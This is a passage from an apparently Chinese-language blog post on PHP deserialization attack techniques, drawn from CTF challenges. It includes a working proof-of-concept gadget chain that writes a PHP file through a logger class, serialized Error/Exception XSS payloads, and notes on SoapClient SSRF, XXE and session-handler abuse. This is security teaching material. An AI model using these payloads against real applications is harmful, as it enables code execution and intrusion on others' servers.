class="hljs-string">&quot;&apos;&gt;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;song-&gt;get_name() . <span class="hljs-string">&quot;&lt;/a&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name_is</span><span class="hljs-params">($name)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;song-&gt;get_name() === $name;</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x8BBA;&#x4E24;&#x4E2A; log &#x65B9;&#x6CD5;&#x7684;&#x9009;&#x62E9;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Logger</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $logwriter;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($writer)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;logwriter = $writer;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span><span class="hljs-params">($txt)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;logwriter-&gt;writeLog($txt);</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Song</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $logger;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $name;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $group;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $url;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($name, $group, $url)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;group = $group;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;url = $url;</span><br><span class="line">    $fltr = <span class="hljs-keyword">new</span> OutputFilter(<span class="hljs-string">&quot;/\[i\](.*)\[\/i\]/i&quot;</span>, <span class="hljs-string">&quot;&lt;i&gt;\\1&lt;/i&gt;&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;logger = <span class="hljs-keyword">new</span> Logger(<span class="hljs-keyword">new</span> LogWriter_File(<span class="hljs-string">&quot;song_views&quot;</span>, <span class="hljs-keyword">new</span> LogFileFormat(<span class="hljs-keyword">array</span>($fltr), <span class="hljs-string">&quot;\n&quot;</span>)));</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;a href=&apos;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;url . <span class="hljs-string">&quot;&apos;&gt;&lt;i&gt;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;name . <span class="hljs-string">&quot;&lt;/i&gt;&lt;/a&gt; by &quot;</span> . <span class="hljs-keyword">$this</span>-&gt;group;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;logger-&gt;log(<span class="hljs-string">&quot;Song &quot;</span> . <span class="hljs-keyword">$this</span>-&gt;name . <span class="hljs-string">&quot; by [i]&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;group . <span class="hljs-string">&quot;[/i] viewed.\n&quot;</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_name</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;name;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>LogWriter_File::writeLog($txt) &#x7684;&#x5199;&#x5165;&#x6587;&#x4EF6;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogWriter_File</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $filename;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $format;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($filename, $format)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;filename = str_replace(<span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-string">&quot;__&quot;</span>, str_replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, $filename));</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;format = $format;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">writeLog</span><span class="hljs-params">($txt)</span> </span>{</span><br><span class="line">    $txt = <span class="hljs-keyword">$this</span>-&gt;format-&gt;format($txt);</span><br><span class="line">    <span class="hljs-comment">//<span class="hljs-doctag">TODO:</span> Modify the address here, and delete this TODO.</span></span><br><span class="line">    file_put_contents(<span class="hljs-string">&quot;C:\\WWW\\test\\ctf\\kon\\&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;filename, $txt, FILE_APPEND);</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>LogFileFormat::format </p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogFileFormat</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $filters;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $endl;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($filters, $endl)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;filters = $filters;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;endl = $endl;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">format</span><span class="hljs-params">($txt)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;filters <span class="hljs-keyword">as</span> $filter) {</span><br><span class="line">      $txt = $filter-&gt;filter($txt);</span><br><span class="line">    }</span><br><span class="line">    $txt = str_replace(<span class="hljs-string">&apos;\n&apos;</span>, <span class="hljs-keyword">$this</span>-&gt;endl, $txt);</span><br><span class="line">    <span class="hljs-keyword">return</span> $txt;</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>OutputFilter::filter &#x81EA;&#x5B9A;&#x4E49; preg_replace &#x5185;&#x5BB9;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OutputFilter</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $matchPattern;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $replacement;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($pattern, $repl)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;matchPattern = $pattern;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;replacement = $repl;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($data)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-keyword">$this</span>-&gt;matchPattern, <span class="hljs-keyword">$this</span>-&gt;replacement, $data);</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><code>preg_replace</code> &#x548C; <code>str_replace</code> &#x7684;&#x533A;&#x522B;</p>
<p><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200131027.png" alt="image-20201113200131027"></p>
<p>final POC</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OutputFilter</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $matchPattern;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $replacement;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;matchPattern = <span class="hljs-string">&quot;//&quot;</span>;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;replacement = <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogFileFormat</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $filters;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $endl;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;filters = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> OutputFilter()); <span class="hljs-comment"># foreach ($this-&gt;filters as $filter)</span></span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;endl = <span class="hljs-string">&apos;\n&apos;</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogWriter_File</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $filename;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $format;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;filename = <span class="hljs-string">&quot;info.php&quot;</span>;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;format = <span class="hljs-keyword">new</span> LogFileFormat();</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Logger</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $logwriter;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;logwriter = <span class="hljs-keyword">new</span> LogWriter_File();</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Lyrics</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $lyrics;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $song;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;lyrics = <span class="hljs-string">&apos;1&apos;</span>;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;song = <span class="hljs-keyword">new</span> Logger();</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$payload = <span class="hljs-keyword">new</span> Lyrics();</span><br><span class="line">print_r(urlencode(serialize($payload)));</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200248029.png" alt="image-20201113200248029"></p>
<h2 id="&#x539F;&#x751F;&#x7C7B;&#x5229;&#x7528;"><a href="#&#x539F;&#x751F;&#x7C7B;&#x5229;&#x7528;" class="headerlink" title="&#x539F;&#x751F;&#x7C7B;&#x5229;&#x7528;"></a>&#x539F;&#x751F;&#x7C7B;&#x5229;&#x7528;</h2><h3 id="ZipArchive-open"><a href="#ZipArchive-open" class="headerlink" title="ZipArchive::open"></a>ZipArchive::open</h3><p>@Threezh1 &#x6587;&#x4E2D;&#x5DF2;&#x7ECF;&#x5199;&#x7684;&#x5F88;&#x8BE6;&#x7EC6;&#x4E86;&#x3002;&#x8FD9;&#x91CC;&#x4E0D;&#x518D;&#x8865;&#x5145;<br><a href="https://xz.aliyun.com/t/6454#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/6454#toc-10</a></p>
<h3 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h3><p>&#x5173;&#x4E8E;SOAP&#x5B89;&#x5168;&#x95EE;&#x9898;&#xFF1A;<a href="https://www.anquanke.com/post/id/153065#h2-1" target="_blank" rel="noopener">https://www.anquanke.com/post/id/153065#h2-1</a></p>
<p>&#x5229;&#x7528;&#x6761;&#x4EF6;&#xFF1A;<br>&#x9700;&#x8981;&#x6709;soap&#x6269;&#x5C55;&#xFF0C;&#x4E14;&#x4E0D;&#x662F;&#x9ED8;&#x8BA4;&#x5F00;&#x542F;&#xFF0C;&#x9700;&#x8981;&#x624B;&#x52A8;&#x5F00;&#x542F;<br>&#x9700;&#x8981;&#x8C03;&#x7528;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x65B9;&#x6CD5;&#x89E6;&#x53D1;&#x5176;<code>__call()</code>&#x51FD;&#x6570;</p>
<p>&#x4EC5;&#x9650;&#x4E8E;http/https&#x534F;&#x8BAE;&#xFF0C;&#x4E14;http&#x5934;&#x90E8;&#x8FD8;&#x5B58;&#x5728;crlf&#x6F0F;&#x6D1E;(SOAP + CRLF = SSRF)</p>
<p>&#x4F8B;&#x5B50;&#x53EF;&#x89C1;&#x4E0B;&#x6587;: LCTF2018-bestphp&#x2019;s revenge </p>
<h3 id="Error-XSS"><a href="#Error-XSS" class="headerlink" title="Error XSS"></a>Error XSS</h3><p>@l3m0n &#x5E08;&#x5085;blog&#x4E2D;&#x63D0;&#x5230;&#x4E86;XSS</p>
<p>Error<br>&#x9002;&#x7528;&#x4E8E;php7&#x7248;&#x672C;</p>
<p>XSS<br>&#x5F00;&#x542F;&#x62A5;&#x9519;&#x7684;&#x60C5;&#x51B5;&#x4E0B;:<br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$a = <span class="hljs-keyword">new</span> Error(<span class="hljs-string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="hljs-keyword">echo</span> urlencode($b);</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//Test</span></span><br><span class="line">$t = urldecode(<span class="hljs-string">&apos;O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D&apos;</span>);</span><br><span class="line">$c = unserialize($t);</span><br><span class="line"><span class="hljs-keyword">echo</span> $c;</span><br></pre></td></tr></tbody></table></figure><p></p>
<h3 id="Exception-XSS"><a href="#Exception-XSS" class="headerlink" title="Exception XSS"></a>Exception XSS</h3><p>@l3m0n &#x5E08;&#x5085;blog&#x4E2D;&#x63D0;&#x5230;&#x4E86;XSS</p>
<p>Exception<br>&#x9002;&#x7528;&#x4E8E;php5&#x3001;7&#x7248;&#x672C;</p>
<p>XSS<br>&#x5F00;&#x542F;&#x62A5;&#x9519;&#x7684;&#x60C5;&#x51B5;&#x4E0B;:<br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$a = <span class="hljs-keyword">new</span> <span class="hljs-keyword">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="hljs-keyword">echo</span> urlencode($b);</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//Test</span></span><br><span class="line">$c = urldecode(<span class="hljs-string">&apos;O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D&apos;</span>);</span><br><span class="line"><span class="hljs-keyword">echo</span> unserialize($c);</span><br></pre></td></tr></tbody></table></figure><p></p>
<h3 id="&#x591A;&#x79CD;&#x59FF;&#x52BF;&#x7EC4;&#x5408;&#x62F3;"><a href="#&#x591A;&#x79CD;&#x59FF;&#x52BF;&#x7EC4;&#x5408;&#x62F3;" class="headerlink" title="&#x591A;&#x79CD;&#x59FF;&#x52BF;&#x7EC4;&#x5408;&#x62F3;"></a>&#x591A;&#x79CD;&#x59FF;&#x52BF;&#x7EC4;&#x5408;&#x62F3;</h3><p>&#x4F8B;&#x5B50;&#x53EF;&#x89C1;:Pornhub&#x67D0;&#x6F0F;&#x6D1E; &#xFF1A; <a href="https://5haked.blogspot.com/2016/10/how-i-hacked-pornhub-for-fun-and-profit.html?m=1" target="_blank" rel="noopener">https://5haked.blogspot.com/2016/10/how-i-hacked-pornhub-for-fun-and-profit.html?m=1</a></p>
<p>&#x6D89;&#x53CA;&#x59FF;&#x52BF;&#x5982;&#x4E0B;<br>&#x53EF;&#x83B7;&#x53D6;&#x76EE;&#x5F55;&#xFF1A; DirectoryIterator<br>XXE&#xFF1A; SimpleXMLElement<br>&#x521B;&#x5EFA;&#x7A7A;&#x767D;&#x6587;&#x4EF6;&#xFF1A; SQLite3</p>
<h2 id="&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x9003;&#x9038;"><a href="#&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x9003;&#x9038;" class="headerlink" title="&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x9003;&#x9038;"></a>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x9003;&#x9038;</h2><p>&#x539F;&#x7406;: &#x5BF9;&#x7C7B;&#x4E2D;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x5C5E;&#x6027;&#x4E5F;&#x4F1A;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x3002;&#x4E14;PHP &#x5728;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#xFF0C;&#x5E95;&#x5C42;&#x4EE3;&#x7801;&#x662F;&#x4EE5; <code>;</code>&#x4F5C;&#x4E3A;&#x5B57;&#x6BB5;&#x7684;&#x5206;&#x9694;&#xFF0C;&#x4EE5; <code>}</code>&#x4F5C;&#x4E3A;&#x7ED3;&#x5C3E;(&#x5B57;&#x7B26;&#x4E32;&#x9664;&#x5916;)&#xFF0C;&#x5E76;&#x4E14;&#x662F;&#x6839;&#x636E;&#x957F;&#x5EA6;&#x5224;&#x65AD;&#x5185;&#x5BB9;&#x7684;</p>
<p>&#x5229;&#x7528;: &#x6784;&#x9020;&#x5B57;&#x7B26;&#x4E32;</p>
<h3 id="&#x4F8B;&#x5B50;&#x4E00;"><a href="#&#x4F8B;&#x5B50;&#x4E00;" class="headerlink" title="&#x4F8B;&#x5B50;&#x4E00;"></a>&#x4F8B;&#x5B50;&#x4E00;</h3><p>0ctf2016 &#x4E00;&#x9053;web&#x9898;&#xFF08;&#x5F85;&#x66F4;&#x65B0;</p>
<h3 id="&#x4F8B;&#x5B50;&#x4E8C;"><a href="#&#x4F8B;&#x5B50;&#x4E8C;" class="headerlink" title="&#x4F8B;&#x5B50;&#x4E8C;"></a>&#x4F8B;&#x5B50;&#x4E8C;</h3><p>&#x5B89;&#x6D35;&#x676F; - easy_serialize_php<br><a href="https://xz.aliyun.com/t/6911#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/6911#toc-3</a></p>
<h2 id="Session-&#x53CD;&#x5E8F;&#x5217;&#x5316;"><a href="#Session-&#x53CD;&#x5E8F;&#x5217;&#x5316;" class="headerlink" title="Session &#x53CD;&#x5E8F;&#x5217;&#x5316;"></a>Session &#x53CD;&#x5E8F;&#x5217;&#x5316;</h2><h3 id="&#x53C2;&#x6570;&#x76F8;&#x5173;"><a href="#&#x53C2;&#x6570;&#x76F8;&#x5173;" class="headerlink" title="&#x53C2;&#x6570;&#x76F8;&#x5173;"></a>&#x53C2;&#x6570;&#x76F8;&#x5173;</h3><p>session&#x76F8;&#x5173;&#x53C2;&#x6570;&#x914D;&#x7F6E;</p>
<table>
<thead>
<tr>
<th align="center">Directive</th>
<th align="center">&#x542B;&#x4E49;</th>
</tr>
</thead>
<tbody><tr>
<td align="center">session.save_handler</td>
<td align="center">session&#x4FDD;&#x5B58;&#x5F62;&#x5F0F;&#x3002;&#x9ED8;&#x8BA4;&#x4E3A;files</td>
</tr>
<tr>
<td align="center">session.save_path</td>
<td align="center">&#x8BBE;&#x7F6E;session&#x7684;&#x5B58;&#x50A8;&#x8DEF;&#x5F84;,&#x9ED8;&#x8BA4;&#x5728;/tmp</td>
</tr>
<tr>
<td align="center">session.serialize_handler</td>
<td align="center">session&#x5E8F;&#x5217;&#x5316;&#x5B58;&#x50A8;&#x6240;&#x7528;&#x5904;&#x7406;&#x5668;&#x3002;&#x9ED8;&#x8BA4;&#x4E3A;php&#x3002;</td>
</tr>
<tr>
<td align="center">session.upload_progress.cleanup</td>
<td align="center">&#x4E00;&#x65E6;&#x8BFB;&#x53D6;&#x4E86;&#x6240;&#x6709;POST&#x6570;&#x636E;&#xFF0C;&#x7ACB;&#x5373;&#x6E05;&#x9664;&#x8FDB;&#x5EA6;&#x4FE1;&#x606F;&#x3002;&#x9ED8;&#x8BA4;&#x5F00;&#x542F;</td>
</tr>
<tr>
<td align="center">session.upload_progress.enabled</td>
<td align="center">&#x5C06;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x7684;&#x8FDB;&#x5EA6;&#x4FE1;&#x606F;&#x5B58;&#x5728;session&#x4E2D;&#x3002;&#x9ED8;&#x8BA4;&#x5F00;&#x542F;&#x3002;</td>
</tr>
</tbody></table>
<p>PHP&#x5904;&#x7406;&#x5668;&#x4E09;&#x79CD;&#x5E8F;&#x5217;&#x5316;&#x65B9;&#x5F0F;</p>
<table>
<thead>
<tr>
<th align="center">&#x5904;&#x7406;&#x5668;</th>
<th align="center">&#x5BF9;&#x5E94;&#x7684;&#x5B58;&#x50A8;&#x683C;&#x5F0F;</th>
</tr>
</thead>
<tbody><tr>
<td align="center">php_binary</td>
<td align="center">&#x952E;&#x540D;&#x7684;&#x957F;&#x5EA6;&#x5BF9;&#x5E94;&#x7684;ASCII&#x5B57;&#x7B26;&#xFF0B;&#x952E;&#x540D;&#xFF0B;&#x7ECF;&#x8FC7;serialize() &#x51FD;&#x6570;&#x53CD;&#x5E8F;&#x5217;&#x5904;&#x7406;&#x7684;&#x503C;</td>
</tr>
<tr>
<td align="center">php</td>
<td align="center">&#x952E;&#x540D;&#xFF0B;&#x7AD6;&#x7EBF;&#xFF0B;&#x7ECF;&#x8FC7;serialize()&#x51FD;&#x6570;&#x53CD;&#x5E8F;&#x5217;&#x5904;&#x7406;&#x7684;&#x503C;</td>
</tr>
<tr>
<td align="center">php_serialize</td>
<td align="center">serialize()&#x51FD;&#x6570;&#x53CD;&#x5E8F;&#x5217;&#x5904;&#x7406;&#x6570;&#x7EC4;&#x65B9;&#x5F0F;</td>
</tr>
</tbody></table>
<h3 id="&#x5DEE;&#x5F02;&#x6027;"><a href="#&#x5DEE;&#x5F02;&#x6027;" class="headerlink" title="&#x5DEE;&#x5F02;&#x6027;"></a>&#x5DEE;&#x5F02;&#x6027;</h3><p>PHP&#x5904;&#x7406;&#x5668;&#x5DEE;&#x5F02;&#x6027;&#x5982;&#x4E0B;<br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="hljs-string">&apos;session.serialize_handler&apos;</span>,<span class="hljs-string">&apos;&apos;</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="hljs-string">&apos;name&apos;</span>] = $_GET[<span class="hljs-string">&apos;name&apos;</span>];</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>URL&#x4F20;&#x53C2;&#xFF0C;<code>?name=P2hm1n</code>&#x3002;session&#x4EE5;&#x6587;&#x672C;&#x5B58;&#x50A8;&#x65B9;&#x5F0F;&#x4FDD;&#x5B58;&#x5728; <code>/tmp</code> &#x76EE;&#x5F55;&#x4E0B;&#x3002;<p></p>
<p>php: <code>name|s:6:&quot;P2hm1n&quot;;</code><br>php_binary: <code>&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;names:6:&quot;P2hm1n&quot;;</code><br>php_serialize: <code>a:1:{s:4:&quot;name&quot;;s:6:&quot;P2hm1n&quot;;}</code></p>
<p>&#x6F0F;&#x6D1E;&#x6838;&#x5FC3;&#x4E5F;&#x4F53;&#x73B0;&#x5728; <strong>&#x5DEE;&#x5F02;&#x6027;</strong> &#x4E09;&#x4E2A;&#x5B57;</p>
<p>Q: &#x4EC0;&#x4E48;&#x662F;&#x5DEE;&#x5F02;&#x6027;:<br>A: &#x9009;&#x62E9;&#x7684;&#x5904;&#x7406;&#x65B9;&#x5F0F;&#x4E0D;&#x540C;&#xFF0C;&#x5E8F;&#x5217;&#x5316;&#x548C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x65B9;&#x5F0F;&#x4EA6;&#x4E0D;&#x540C;&#x3002;&#x5982;&#x679C;&#x7F51;&#x7AD9;&#x5E8F;&#x5217;&#x5316;&#x5E76;&#x5B58;&#x50A8;Session&#x4E0E;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5E76;&#x8BFB;&#x53D6;Session&#x7684;&#x65B9;&#x5F0F;&#x4E0D;&#x540C;&#xFF0C;&#x5C31;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x6F0F;&#x6D1E;&#x7684;&#x4EA7;&#x751F;&#x3002;</p>
<h3 id="&#x653B;&#x51FB;&#x624B;&#x6BB5;"><a href="#&#x653B;&#x51FB;&#x624B;&#x6BB5;" class="headerlink" title="&#x653B;&#x51FB;&#x624B;&#x6BB5;"></a>&#x653B;&#x51FB;&#x624B;&#x6BB5;</h3><h4 id="trick-1"><a href="#trick-1" class="headerlink" title="trick-1"></a>trick-1</h4><p>&#x5229;&#x7528;&#x524D;&#x63D0;: &#x811A;&#x672C;&#x4E2D;&#x8BBE;&#x7F6E;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x5904;&#x7406;&#x5668;&#x4E0E;php.ini&#x8BBE;&#x7F6E;&#x7684;&#x4E0D;&#x540C;</p>
<p>&#x5E38;&#x89C1;&#x6F0F;&#x6D1E;&#x573A;&#x666F;: <code>php_serilize</code> &#x65B9;&#x5F0F;&#x5B58;&#x5165;&#xFF0C;&#x89E3;&#x6790;&#x53C8;&#x662F;&#x7528;&#x7684; <code>php</code> &#x5904;&#x7406;&#x5668;</p>
